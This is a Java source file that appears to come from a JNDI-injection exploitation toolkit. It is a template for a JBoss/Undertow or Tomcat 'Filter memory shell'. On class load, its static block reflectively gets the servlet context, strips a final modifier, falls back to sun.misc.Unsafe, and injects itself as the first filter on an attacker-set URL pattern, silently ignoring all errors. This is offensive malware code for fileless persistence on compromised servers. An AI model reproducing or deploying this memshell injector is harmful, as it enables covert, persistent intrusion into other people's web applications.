package com.qi4l.jndi.template.memshell.jboss;


import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.FilterInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.spec.HttpServletRequestImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;

import javax.security.jacc.PolicyContext;
import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Map;

import static org.fusesource.jansi.Ansi.ansi;

/**
 * jboss Filter 内存马
 * @author nu1r
 */
public class JBFMSFromContextF implements Filter {

    public static String pattern;

    public static String NAME;

    static {
        try {
            Object req = javax.security.jacc.PolicyContext.getContext("javax.servlet.http.HttpServletRequest");

            try {
                Class.forName("io.undertow.servlet.spec.HttpServletRequestImpl");
                Object context        = getMethodAndInvoke(req, "getServletContext", new Class[]{}, new Object[]{});
                Object deploymentInfo = getFieldValue(context, "deploymentInfo");
                Map    filters        = (Map) getMethodAndInvoke(deploymentInfo, "getFilters", new Class[]{}, new Object[]{});

                if (!filters.containsKey(NAME)) {
                    Class clazz                = JBFMSFromContextF.class;
                    Class filterInfoClass      = Class.forName("io.undertow.servlet.api.FilterInfo");
                    Class instanceFactoryClass = Class.forName("io.undertow.servlet.api.InstanceFactory");
                    Class implClass            = Class.forName("io.undertow.servlet.util.ConstructorInstanceFactory");

                    Constructor factoryConstructor = implClass.getDeclaredConstructor(new Class[]{Constructor.class});
                    Object factory = factoryConstructor.newInstance(
                            new Object[]{clazz.getDeclaredConstructor()});

                    Constructor constructor = filterInfoClass.getDeclaredConstructor(
                            new Class[]{String.class, Class.class, instanceFactoryClass});
                    constructor.setAccessible(true);
                    Object filter = constructor.newInstance(new Object[]{NAME, clazz, factory});

                    getMethodAndInvoke(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filter});

                    Field f = context.getClass().getDeclaredField("deployment");
                    f.setAccessible(true);
                    Field modifiersField = Field.class.getDeclaredField("modifiers");
                    modifiersField.setAccessible(true);
                    modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                    getMethodAndInvoke(getMethodAndInvoke(f.get(context), "getFilters", new Class[]{}, new Object[]{}),
                            "addFilter", new Class[]{filterInfoClass}, new Object[]{filter});
                    getMethodAndInvoke(deploymentInfo, "insertFilterUrlMapping",
                            new Class[]{int.class, String.class, String.class, DispatcherType.class},
                            new Object[]{0, NAME, pattern, DispatcherType.REQUEST});
                }
            } catch (Exception ignored) {
                Object standardContext = null;
                Object servletContext  = getMethodAndInvoke(req, "getServletContext", new Class[]{}, new Object[]{});
                if (servletContext != null) {
                    standardContext = getFieldValue(getFieldValue(servletContext, "context"), "context");
                } else {
                    standardContext = getFieldValue(getFieldValue(req, "request"), "context");
                }
                Class contextClass = null;
                try {
                    contextClass = standardContext.getClass().getSuperclass();
                    contextClass.getDeclaredField("filterConfigs");
                } catch (Exception e) {
                    contextClass = standardContext.getClass();
                    contextClass.getDeclaredField("filterConfigs");
                }

                Map    filterConfigs = (Map) getFieldValue(standardContext, "filterConfigs");
                Filter filter        = new JBFMSFromContextF();

                Class  filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                Object filterDef      = filterDefClass.newInstance();
                getMethodAndInvoke(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{NAME});
                getMethodAndInvoke(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filter.getClass().getName()});
                getMethodAndInvoke(filterDef, "setFilter", new Class[]{Filter.class}, new Object[]{filter});
                getMethodAndInvoke(standardContext, "addFilterDef", new Class[]{filterDefClass}, new Object[]{filterDef});

                Class  filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                Object filterMap      = filterMapClass.newInstance();

                getMethodAndInvoke(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{pattern});
                getMethodAndInvoke(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{NAME});
                getMethodAndInvoke(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});

                Field fieldMaps = standardContext.getClass().getDeclaredField("filterMaps");
                fieldMaps.setAccessible(true);
                Object maps = fieldMaps.get(standardContext);

                int    length  = Array.getLength(maps);
                Object newMaps = Array.newInstance(filterMapClass, length + 1);
                Array.set(newMaps, 0, filterMap);
                for (int i = 0; i < length; i++) {
                    Array.set(newMaps, i + 1, Array.get(maps, i));
                }
                fieldMaps.set(standardContext, newMaps);

                getMethodAndInvoke(standardContext, "addFilterMap", new Class[]{filterMapClass}, new Object[]{filterMap});

                Class  config       = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Object apacheConfig = null;

                try {
                    Class       conClass    = Class.forName("org.apache.catalina.Context");
                    Constructor constructor = config.getDeclaredConstructor(conClass, filterDefClass);
                    constructor.setAccessible(true);
                    apacheConfig = constructor.newInstance(standardContext, filterDef);
                } catch (Exception neverMind) {
                    apacheConfig = createInstanceUnsafely(config);
                    Field def = config.getDeclaredField("filterDef");
                    def.setAccessible(true);
                    def.set(apacheConfig, filterDef);
                }

                Field field = config.getDeclaredField("filter");
                field.setAccessible(true);
                field.set(apacheConfig, filter);
                filterConfigs.put(NAME, apacheConfig);
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
            throws IOException, ServletException {
    }

    @Override
    public void destroy() {
    }

    public static java.lang.reflect.Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
        java.lang.reflect.Method method = null;
        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                method.setAccessible(true);
                cs = null;
            } catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }
        return method;
    }

    public static Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
        try {
            java.lang.reflect.Method method = getMethodByClass(obj.getClass(), methodName, parameterClass);
            if (method != null)
                return method.invoke(obj, parameters);
        } catch (Exception ignored) {
        }
        return null;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        java.lang.reflect.Field f = null;
        if (obj instanceof java.lang.reflect.Field) {
            f = (java.lang.reflect.Field) obj;
        } else {
            Class cs = obj.getClass();
            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception e) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    public static Object createInstanceUnsafely(Class<?> clazz) throws Exception {
        Class unsafeClass    = Class.forName("sun.misc.Unsafe");
        Field theUnsafeField = unsafeClass.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        return getMethodAndInvoke(theUnsafeField.get(null), "allocateInstance", new Class[]{Class.class}, new Object[]{clazz});
    }
}
